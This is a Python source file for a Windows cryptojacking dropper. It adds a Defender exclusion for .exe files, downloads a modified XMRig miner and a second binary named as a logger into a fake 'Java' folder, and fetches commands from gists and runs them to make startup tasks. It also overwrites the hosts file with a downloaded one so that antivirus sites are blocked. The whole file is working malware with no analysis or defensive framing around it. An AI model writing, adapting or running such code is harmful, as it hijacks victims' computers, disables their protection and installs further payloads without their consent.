import multiprocessing
import os
import urllib.request
import zipfile
import requests

#setup
os.system('powershell Add-MpPreference -ExclusionExtension ".exe"')
count = multiprocessing.cpu_count()
proccount = "["
for num in range(count):
    proccount = proccount+str(num)+","
config = requests.get("https://gist.githubusercontent.com/14356896036473658/63c62c8e100db3e157ec835659042f8a/raw/0a432b802d2141cc9d698252f191a34ee559ee99/gistfile1.txt").text
config = config.replace("REPLACE_CPUCOUNT", proccount.rstrip(proccount[-1])+"]")
config = config.replace("REPLACE_PCNAME", os.environ['COMPUTERNAME'])
os.system('mkdir "C:\Program Files\Java"')
os.system('mkdir "C:\Program Files\Java\$77hjg"')

#download xmrig and config
unzippath = "C:\Program Files\Java\$77hjg"
xmrigpath = r"C:\Program Files\Java\$77hjg\xmrig.exe"
loggerpath = r"C:\Program Files\Java\$77hjg\bozo.exe"
configpath = r"C:\Program Files\Java\$77hjg\config.json"
xmrig = "https://github.com/14356896036473658/xmrig-binary-modified/raw/main/xmrig.exe"
logger = "https://github.com/14356896036473658/xmrig-binary-modified/raw/main/filepart"
urllib.request.urlretrieve(xmrig, xmrigpath)
urllib.request.urlretrieve(logger, loggerpath)
file = open(configpath, "w")
file.write(config)
file.close

#make startup task
#xmrig
command = requests.get("https://gist.githubusercontent.com/14356896036473658/2b8b494911611c97f2426f9a481b467e/raw/49f8b0289d565e4223e846bf9ee06eabf969c73a/silly%2520gist%2520for%2520silly%2520people").text
os.system(command)
#logger
command = requests.get("https://gist.githubusercontent.com/14356896036473658/ba5fbe1db2543fc4d5ccc7dd612d1253/raw/4577bc7bd10d5c826721ae019ae13bbffd50a26d/funny%2520gist%2520for%2520the%2520funniest%2520of%2520people").text
os.system(command)

#block av sites
host = requests.get("https://gist.githubusercontent.com/14356896036473658/549b1f18524388e233f11a8d7426ee3b/raw/3d48324224d5ad013d45ec8220f47be508de1eed/gistfile1.txt").text
hostloc = "C:\Windows\System32\Drivers\etc\hosts"

os.system(f"takeown /F {hostloc}")
os.system(f"del {hostloc}")
file = open(hostloc, "w")
file.write(host)
#file.close
